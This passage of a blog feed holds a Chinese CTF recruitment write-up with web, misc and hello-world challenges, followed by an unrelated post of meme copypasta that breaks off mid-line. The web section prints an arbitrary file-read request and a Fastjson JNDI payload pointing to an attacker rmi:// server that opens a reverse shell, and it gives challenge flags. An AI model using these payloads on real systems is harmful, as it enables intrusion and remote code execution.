alt="image-20231020225955850"></p><p>确定，<strong>更多操作–&gt;执行一次</strong></p><p>访问<code>/common/download/resource?resource=Info.xml:.zip</code></p><p>得到flag1，<del>我才不会告诉你我不是这么获取的</del>，我当时试了半天得不到，直接第二题</p><p><em><strong>CNSS{Fr0M_4rb1trA2y</strong></em></p></blockquote><h3 id="Flag-Part-2"><a href="#Flag-Part-2" class="headerlink" title="Flag Part 2"></a>Flag Part 2</h3><p>提示<code>/proc</code></p><blockquote><blockquote><p><a href="https://zhuanlan.zhihu.com/p/378388389">Linux系统proc目录说明 - 知乎 (zhihu.com)</a></p></blockquote><ol><li><p>用上面的漏洞访问获得<code>/proc/cmdline</code></p><p>获得<code>/usr/local/jdk8/bin/java -Xms64m -Xmx512m -jar /tmp/source/ruoyi.jar </code></p></li><li><p>得到<code>jar</code>包的路径：<code>/tmp/source/ruoyi.jar</code></p><p>再用上面漏洞获得<code>jar</code></p></li><li><p>使用<code>idea</code></p><ol><li><p>进入<code>idea</code>的路径<code>IntelliJ IDEA 2023.2.3\plugins\java-decompiler\lib</code>可以注意到文件夹有个<code>java-decompiler.jar</code></p></li><li><p>把<code>ruoyi.jar</code>复制到此文件夹</p></li><li><p>创建一个<code>ruoyi</code>文件夹</p></li><li><p>命令行写入<code>java -cp &quot;xxxx\plugins\java-decompiler\lib\java-decompiler.jar&quot; org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true ruoyi.jar ruoyi</code>回车执行</p></li><li><p>得到逆向的包，并解压，用<code>idea</code>打开</p></li><li><p>双击<code>shift</code>，搜索<code>part2</code>，得到flag</p><p><img src="/posts/43716/image-20231020234402549.png" alt="image-20231020234402549"></p></li></ol><p><em><strong>_f1L3_Reaol_Vuln3rab1l1Ty</strong></em></p></li></ol></blockquote><h3 id="Flag-Part-3"><a href="#Flag-Part-3" class="headerlink" title="Flag Part 3"></a>Flag Part 3</h3><blockquote><blockquote><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit: JNDI注入测试工具（A tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability,like Jackson,Fastjson,etc）</a></p><p>获取jndi工具</p><p>JNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于Fastjson、Jackson等相关漏洞的验证。</p></blockquote><p>git到vps上，<del>嘿嘿我在本地试了半天</del>、</p><p>根据上面获得的源码，可知<code>fastjson</code>的攻击地址为<code>/common/sign</code>，请求方式为<code>POST</code>，且post的数据经过了AES解密</p><p>所以我们需要先加密再post</p><p>查看<code>AESUtils.java</code>的<code>decryptAES</code></p><p><img src="/posts/43716/image-20231021000823583.png" alt="image-20231021000823583"></p><p>可以看到加密类型为<code>AES/CBC/PKCS7Padding</code>，且需要base64解密</p><blockquote><p>关于jndi</p><p><a href="https://blog.csdn.net/hapenl/article/details/127299130">FastJson远程代码执行漏洞基于JNDI反弹shell使用_fastjson反弹shell_Hapen_Lu的博客-CSDN博客</a></p></blockquote><p>启动jndi服务，vps同时监听payload的端口</p><p>版本为jar1.8，选择1.8的rmi</p><p><code>&#123;&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://xxx:1099/0v7hzy &quot;,&quot;autoCommit&quot;:true&#125;&#125;</code></p><p>随便找个aes加密网站</p><p><img src="/posts/43716/image-20231021002435641.png" alt="image-20231021002435641"></p><p>打开你的post工具，这里我用的是<code>postman</code></p><p><img src="/posts/43716/image-20231020235903632.png" alt="image-20231020235903632"></p><p>把登陆的cookie复制到postman</p><p><img src="/posts/43716/image-20231021002458070.png" alt="image-20231021002458070"></p><p>根据<code>com.ruoyi.project.system.config.domain.Sign</code></p><p><img src="/posts/43716/image-20231020235051990.png" alt="image-20231020235051990"></p><p>发送json数据</p><p><img src="/posts/43716/image-20231021002519074.png" alt="image-20231021002519074"></p><p>查看监听，可以发现已经连接上了</p><p><img src="/posts/43716/image-20231021002752134.png" alt="image-20231021002752134"></p><p>（如果跟我一样flag1没拿到也可以在这cat获得</p><p><em><strong>_to_R3m0te_COde_Ex2cuT10n!!!}</strong></em></p></blockquote><p>整理一下，得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;Fr0M_4rb1trA2y_f1L3_Reaol_Vuln3rab1l1Ty_to_R3m0te_COde_Ex2cuT10n!!!&#125;</code></font></center></strong></em></p><h2 id="Boss-🗡-CNSS娘の复仇-1"><a href="#Boss-🗡-CNSS娘の复仇-1" class="headerlink" title="[Boss] 🗡 CNSS娘の复仇 - 1"></a>[Boss] 🗡 CNSS娘の复仇 - 1</h2><p><del>访问到&#x2F;assets&#x2F;发现别人的webshell没删</del></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;E4sy_Y1i2_uN5er1Aliz3_7o_RcE!&#125;</code></font></center></strong></em></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Guideline-🥰-SignIn"><a href="#Guideline-🥰-SignIn" class="headerlink" title="[Guideline] 🥰 SignIn"></a>[Guideline] 🥰 SignIn</h2><p>跟暑假赛一样，在qq群里，不会有人找不到吧~~</p><h2 id="Baby-🧐-招新平台的彩蛋"><a href="#Baby-🧐-招新平台的彩蛋" class="headerlink" title="[Baby]🧐 招新平台的彩蛋"></a>[Baby]🧐 招新平台的彩蛋</h2><p>左上角，原神启动！（其实我是翻源码找到的</p><h2 id="Easy-✨-星光下的梦想"><a href="#Easy-✨-星光下的梦想" class="headerlink" title="[Easy] ✨ 星光下的梦想"></a>[Easy] ✨ 星光下的梦想</h2><p>mp3文件，丢到<code>Audacity</code>康康，右键切到频谱图</p><p><img src="/posts/43716/image-20231025174055018.png" alt="image-20231025174055018"></p><p>对于我这种眼瞎的很不友好</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;DR34M~UND3RN347H~5T4R11GH7&#125;</code></font></center></strong></em></p><h2 id="Hard-🎉-扫码领取-flag"><a href="#Hard-🎉-扫码领取-flag" class="headerlink" title="[Hard] 🎉 扫码领取 flag"></a>[Hard] 🎉 扫码领取 flag</h2><p>如图</p><p><img src="/posts/43716/BrokenQR.png" alt="BrokenQR"></p><p><code>Format Info Pattern</code>是什么，我也不知道</p><p>这里用到一个网站：<a href="https://merri.cx/qrazybox/">QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx)</a></p><p><img src="/posts/43716/image-20231025175347968.png" alt="image-20231025175347968"></p><p>用<code>Brute-force Format Info Pattern</code>爆破</p><p>稍等一下，点击左上角<code>Editor Mode</code>，出现</p><p><img src="/posts/43716/image-20231025180239074.png" alt="image-20231025180239074"></p><p>点击<code>Decode</code>得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;Ur_Qr_K1NnG!&#125;</code></font></center></strong></em></p><h2 id="Baby-Hello-World-1"><a href="#Baby-Hello-World-1" class="headerlink" title="[Baby] Hello World - 1"></a>[Baby] Hello World - 1</h2><p>签到题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;hello_cnss&#125;</code></font></center></strong></em></p><h2 id="Easy-Hello-World-2"><a href="#Easy-Hello-World-2" class="headerlink" title="[Easy] Hello World - 2"></a>[Easy] Hello World - 2</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">9</span>] = &#123;<span class="hljs-number">72</span>, <span class="hljs-number">105</span>, <span class="hljs-number">44</span>, <span class="hljs-number">32</span>, <span class="hljs-number">67</span>, <span class="hljs-number">78</span>, <span class="hljs-number">83</span>, <span class="hljs-number">83</span>, <span class="hljs-number">33</span> &#125;; <span class="hljs-comment">// Hi, CNSS!</span><br>    <span class="hljs-built_in">puts</span>(a);<br>&#125;<br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;hello_cn33_n0_quotes&#125;</code></font></center></strong></em></p><h2 id="Easy-Hello-World-3"><a href="#Easy-Hello-World-3" class="headerlink" title="[Easy] Hello World - 3"></a>[Easy] Hello World - 3</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>))&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>))&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">switch</span>(<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>))&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;i_d0nt_l1ke_semic0lon&#125;</code></font></center></strong></em></p><h2 id="Realworld-🌏-MCNSS"><a href="#Realworld-🌏-MCNSS" class="headerlink" title="[Realworld] 🌏 MCNSS"></a>[Realworld] 🌏 MCNSS</h2><p><em><strong><center>MC实在是太好玩啦！</center></strong></em></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;a_fAke_F1aG&#125;</code></font></center></strong></em></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF-Recruits</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>疯啦</title>
    <link href="/posts/896/"/>
    <url>/posts/896/</url>
    
    <content type="html"><![CDATA[<h1 id="哈哈哈你来啦"><a href="#哈哈哈你来啦" class="headerlink" title="哈哈哈你来啦"></a>哈哈哈你来啦</h1><ul><li><input checked disabled type="checkbox"> <h5 id="我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！"><a href="#我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！" class="headerlink" title="我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！"></a>我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！</h5></li></ul><blockquote><h3 id="为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？"><a href="#为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？" class="headerlink" title="为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？"></a>为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？</h3></blockquote><ul><li><h2 id="阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开）-（尖叫）（扭曲）（阴暗的爬行）-（爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）"><a href="#阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开）-（尖叫）（扭曲）（阴暗的爬行）-（爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）" class="headerlink" title="阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开） （尖叫）（扭曲）（阴暗的爬行） （爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）"></a>阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开） （尖叫）（扭曲）（阴暗的爬行） （爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）</h2></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fuckworld">console.log(printf(echo 还会再见吗，燕子？(勉强的微笑)再见时你要幸福，好不好(关车门)燕子，你要开心，你要幸福，好不好？开心<br>啊，幸福。你的世界以后没有我了，没关系，你要自己幸福。(嘶吼)燕子！燕子！(哭喊)燕子！没有你我怎么活啊，燕子！(奔跑)(嘶吼)燕子！<br>燕子啊(仰头45度哭泣)(面目狰狞)(不甘的追赶)(咆哮)(无力地喘气)燕子！燕子，你带我走吧，燕子啊(停下)(蹲下)(跪下)(哭泣)(嚎啕大<br>哭););)<br><br></code></pre></td></tr></table></figure><blockquote><h1 id="请你不要生气-如果因为我的文字而骚扰到你-你可以来训我一顿-请不要因为我的这些行为而为我感到担心-我不重要的-我微不足道-我甚至可以和微生物相提并论-我的文字感动不了你似昆仑山上的冰山一般的心-没关系的-不回信息我也不会怎样的-我已经习惯了-已经习以为常了-我常常收不到你的信息-我甚至不知道是不是我手机的问题-就连一个表情包我也未曾收到-后来才发现这是你的问题-我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷-我都懂的-其实我也不是那么重要罢了"><a href="#请你不要生气-如果因为我的文字而骚扰到你-你可以来训我一顿-请不要因为我的这些行为而为我感到担心-我不重要的-我微不足道-我甚至可以和微生物相提并论-我的文字感动不了你似昆仑山上的冰山一般的心-没关系的-不回信息我也不会怎样的-我已经习惯了-已经习以为常了-我常常收不到你的信息-我甚至不知道是不是我手机的问题-就连一个表情包我也未曾收到-后来才发现这是你的问题-我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷-我都懂的-其实我也不是那么重要罢了" class="headerlink" title="请你不要生气 如果因为我的文字而骚扰到你 你可以来训我一顿 请不要因为我的这些行为而为我感到担心 我不重要的 我微不足道 我甚至可以和微生物相提并论 我的文字感动不了你似昆仑山上的冰山一般的心 没关系的 不回信息我也不会怎样的 我已经习惯了 已经习以为常了 我常常收不到你的信息 我甚至不知道是不是我手机的问题 就连一个表情包我也未曾收到 后来才发现这是你的问题 我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷 我都懂的 其实我也不是那么重要罢了"></a>请你不要生气 如果因为我的文字而骚扰到你 你可以来训我一顿 请不要因为我的这些行为而为我感到担心 我不重要的 我微不足道 我甚至可以和微生物相提并论 我的文字感动不了你似昆仑山上的冰山一般的心 没关系的 不回信息我也不会怎样的 我已经习惯了 已经习以为常了 我常常收不到你的信息 我甚至不知道是不是我手机的问题 就连一个表情包我也未曾收到 后来才发现这是你的问题 我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷 我都懂的 其实我也不是那么重要罢了</h1></blockquote><p><a href><em>没错你是个明白人我明白你明白的意思我也是明白人明白人就应该明白我明白你明白的意思只要大家都明白明白人应明白我明白你明白的意思这样网络环境就是充满明白人明白其他明白人所明白的事</em></a></p><blockquote><p><strong><span style="color: red;">你</span><span style="color: orange;">以</span><span style="color: yellow;">为</span><span style="color: green;">我</span><span style="color: blue;">还</span><span style="color: indigo;">会</span><span style="color: violet;">在</span><span style="color: gold;">乎</span><span style="color: silver;">吗</span>?<span style="color: crimson;">我</span><span style="color: coral;">在</span><span style="color: khaki;">昆</span><span style="color: olive;">仑</span><span style="color: lime;">山</span><span style="color: aqua;">练</span><span style="color: teal;">了</span><span style="color: navy;">六</span><span style="color: lavender;">年</span><span style="color: plum;">的</span><span style="color: fuchsia;">剑</span>，<span style="color: purple;">我</span><span style="color: maroon;">的</span><span style="color: red;">心</span><span style="color: orange;">早</span><span style="color: yellow;">就</span><span style="color: green;">和</span><span style="color: blue;">昆</span><span style="color: indigo;">仑</span><span style="color: violet;">山</span><span style="color: gold;">的</span><span style="color: silver;">雪</span><span style="color: crimson;">一</span><span style="color: coral;">样</span><span style="color: khaki;">冷</span><span style="color: olive;">了</span>。<span style="color: lime;">我</span><span style="color: aqua;">在</span><span style="color: teal;">大</span><span style="color: navy;">润</span><span style="color: lavender;">发</span><span style="color: plum;">杀</span><span style="color: fuchsia;">了</span><span style="color: purple;">十</span><span style="color: maroon;">年</span><span style="color: red;">的</span><span style="color: orange;">鱼</span>，<span style="color: yellow;">我</span><span style="color: green;">以</span><span style="color: blue;">为</span><span style="color: indigo;">我</span><span style="color: violet;">的</span><span style="color: gold;">心</span><span style="color: silver;">早</span><span style="color: crimson;">已</span><span style="color: coral;">跟</span><span style="color: khaki;">我</span><span style="color: olive;">的</span><span style="color: lime;">刀</span><span style="color: aqua;">一</span><span style="color: teal;">样</span><span style="color: navy;">冷</span><span style="color: lavender;">了</span>，<span style="color: plum;">可</span><span style="color: fuchsia;">是</span><span style="color: purple;">当</span><span style="color: maroon;">我</span><span style="color: red;">点</span><span style="color: orange;">开</span><span style="color: yellow;">这</span><span style="color: green;">个</span><span style="color: blue;">课</span><span style="color: indigo;">表</span><span style="color: violet;">眼</span><span style="color: gold;">泪</span><span style="color: silver;">如</span><span style="color: crimson;">黄</span><span style="color: coral;">果</span><span style="color: khaki;">树</span><span style="color: olive;">瀑</span><span style="color: lime;">布</span><span style="color: aqua;">般</span><span style="color: teal;">飞</span><span style="color: navy;">流</span><span style="color: lavender;">直</span><span style="color: plum;">下</span>，<span style="color: fuchsia;">划</span><span style="color: purple;">过</span><span style="color: maroon;">我</span><span style="color: red;">的</span><span style="color: orange;">脸</span><span style="color: yellow;">庞</span>，<span style="color: green;">打</span><span style="color: blue;">湿</span><span style="color: indigo;">了</span><span style="color: violet;">我</span><span style="color: gold;">的</span><span style="color: silver;">人</span><span style="color: crimson;">字</span><span style="color: coral;">拖</span>，<span style="color: khaki;">脚</span><span style="color: olive;">趾</span><span style="color: lime;">都</span><span style="color: aqua;">变</span><span style="color: teal;">得</span><span style="color: navy;">酸</span><span style="color: lavender;">涩</span>，<span style="color: plum;">只</span><span style="color: fuchsia;">想</span><span style="color: purple;">说</span>，<span style="color: maroon;">能</span><span style="color: red;">不</span><span style="color: orange;">能</span>…<span style="color: yellow;">不</span><span style="color: green;">要</span>…</strong></p></blockquote><p><em><strong><span style="color:#ff0000">为</span><span style="color:#ff9900">什</span><span style="color:#ffcc00">么</span><span style="color:#66cc00">要</span><span style="color:#00ffcc">我</span><span style="color:#66ccff">做</span><span style="color:#9900cc">选</span><span style="color:#ff0000">择</span><span style="color:#ff9900">，</span><span style="color:#ffcc00">为</span><span style="color:#66cc00">什</span><span style="color:#00ffcc">么</span><span style="color:#66ccff">！</span><span style="color:#9900cc">你</span><span style="color:#ff0000">不</span><span style="color:#ff9900">知</span><span style="color:#ffcc00">道</span><span style="color:#66cc00">我</span><span style="color:#00ffcc">有</span><span style="color:#66ccff">选</span><span style="color:#9900cc">择</span><span style="color:#ff0000">恐</span><span style="color:#ff9900">惧</span><span style="color:#ffcc00">症</span><span style="color:#66cc00">吗</span><span style="color:#00ffcc">，</span><span style="color:#66ccff">你</span><span style="color:#9900cc">不</span><span style="color:#ff0000">知</span><span style="color:#ff9900">道</span><span style="color:#ffcc00">让</span><span style="color:#66cc00">我</span><span style="color:#00ffcc">选</span><span style="color:#66ccff">会</span><span style="color:#9900cc">直</span><span style="color:#ff0000">接</span><span style="color:#ff9900">会</span><span style="color:#ffcc00">让</span><span style="color:#66cc00">我</span><span style="color:#00ffcc">辗</span><span style="color:#66ccff">转</span><span style="color:#9900cc">反</span><span style="color:#ff0000">侧</span><span style="color:#ff9900">参</span><span style="color:#ffcc00">差</span><span style="color:#66cc00">荇</span><span style="color:#00ffcc">菜</span><span style="color:#66ccff">彻</span><span style="color:#9900cc">夜</span><span style="color:#ff0000">难</span><span style="color:#ff9900">眠</span><span style="color:#ffcc00">吗</span><span style="color:#66cc00">，</span><span style="color:#00ffcc">你</span><span style="color:#66ccff">轻</span><span style="color:#9900cc">飘</span><span style="color:#ff0000">飘</span><span style="color:#ff9900">一</span><span style="color:#ffcc00">句</span><span style="color:#66cc00">让</span><span style="color:#00ffcc">我</span><span style="color:#66ccff">选</span><span style="color:#9900cc">却</span><span style="color:#ff0000">让</span><span style="color:#ff9900">我</span><span style="color:#ffcc00">在</span><span style="color:#66cc00">午</span><span style="color:#00ffcc">夜</span><span style="color:#66ccff">梦</span><span style="color:#9900cc">回</span><span style="color:#ff0000">时</span><span style="color:#ff9900">惊</span><span style="color:#ffcc00">醒</span><span style="color:#66cc00">，</span><span style="color:#00ffcc">瞬</span><span style="color:#66ccff">间</span><span style="color:#9900cc">手</span><span style="color:#ff0000">脚</span><span style="color:#ff9900">冰</span><span style="color:#ffcc00">凉</span><span style="color:#66cc00">，</span><span style="color:#00ffcc">我</span><span style="color:#66ccff">想</span><span style="color:#9900cc">要</span><span style="color:#ff0000">挣</span><span style="color:#ff9900">扎</span><span style="color:#ffcc00">却</span><span style="color:#66cc00">没</span><span style="color:#00ffcc">有</span><span style="color:#66ccff">力</span><span style="color:#9900cc">气</span><span style="color:#ff0000">，</span><span style="color:#ff9900">像</span><span style="color:#ffcc00">一</span><span style="color:#66cc00">只</span><span style="color:#00ffcc">缺</span><span style="color:#66ccff">氧</span><span style="color:#9900cc">的</span><span style="color:#ff0000">鱼</span><span style="color:#ff9900">。</span><span style="color:#ffcc00">你</span><span style="color:#66cc00">在</span><span style="color:#00ffcc">乎</span><span style="color:#66ccff">吗</span><span style="color:#9900cc">？</span><span style="color:#ff0000">你</span><span style="color:#ff9900">不</span><span style="color:#ffcc00">在</span><span style="color:#66cc00">乎</span><span style="color:#00ffcc">，</span><span style="color:#66ccff">你</span><span style="color:#9900cc">只</span><span style="color:#ff0000">在</span><span style="color:#ff9900">乎</span><span style="color:#ffcc00">你</span><span style="color:#66cc00">自</span><span style="color:#00ffcc">己</span><span style="color:#66ccff">，</span><span style="color:#9900cc">就</span><span style="color:#ff0000">像</span><span style="color:#ff9900">你</span><span style="color:#ffcc00">不</span><span style="color:#66cc00">在</span><span style="color:#00ffcc">乎</span><span style="color:#66ccff">鱼</span><span style="color:#9900cc">香</span><span style="color:#ff0000">肉</span><span style="color:#ff9900">丝</span><span style="color:#ffcc00">里</span><span style="color:#66cc00">没</span><span style="color:#00ffcc">有</span><span style="color:#66ccff">鱼</span><span style="color:#9900cc">，</span><span style="color:#ff0000">虎</span><span style="color:#ff9900">皮</span><span style="color:#ffcc00">辣</span><span style="color:#66cc00">子</span><span style="color:#00ffcc">里</span><span style="color:#66ccff">没</span><span style="color:#9900cc">有</span><span style="color:#ff0000">老</span><span style="color:#ff9900">虎</span><span style="color:#ffcc00">，</span><span style="color:#66cc00">你</span><span style="color:#00ffcc">也</span><span style="color:#66ccff">不</span><span style="color:#9900cc">在</span><span style="color:#ff0000">乎</span><span style="color:#ff9900">纠</span><span style="color:#ffcc00">结</span><span style="color:#66cc00">到</span><span style="color:#00ffcc">快</span><span style="color:#66ccff">要</span><span style="color:#9900cc">发</span><span style="color:#ff0000">疯</span><span style="color:#ff9900">的</span><span style="color:#ffcc00">我</span><span style="color:#66cc00">。</span><span style="color:#00ffcc">我</span><span style="color:#66ccff">都</span><span style="color:#9900cc">这</span><span style="color:#ff0000">样</span><span style="color:#ff9900">了</span><span style="color:#ffcc00">，</span><span style="color:#66cc00">你</span><span style="color:#00ffcc">却</span><span style="color:#66ccff">还</span><span style="color:#9900cc">能</span><span style="color:#ff0000">若</span><span style="color:#ff9900">无</span><span style="color:#ffcc00">其</span><span style="color:#66cc00">事</span><span style="color:#00ffcc">的</span><span style="color:#66ccff">等</span><span style="color:#9900cc">我</span><span style="color:#ff0000">做</span><span style="color:#ff9900">出</span><span style="color:#ffcc00">决</span><span style="color:#66cc00">定</span><span style="color:#00ffcc">，</span><span style="color:#66ccff">你</span><span style="color:#9900cc">的</span><span style="color:#ff0000">理</span><span style="color:#ff9900">所</span><span style="color:#ffcc00">当</span><span style="color:#66cc00">然</span><span style="color:#00ffcc">像</span><span style="color:#66ccff">利</span><span style="color:#9900cc">剑</span><span style="color:#ff0000">一</span><span style="color:#ff9900">样</span><span style="color:#ffcc00">扎</span><span style="color:#66cc00">在</span><span style="color:#00ffcc">我</span><span style="color:#66ccff">脑</span><span style="color:#9900cc">壳</span><span style="color:#ff0000">上</span><span style="color:#ff9900">，</span><span 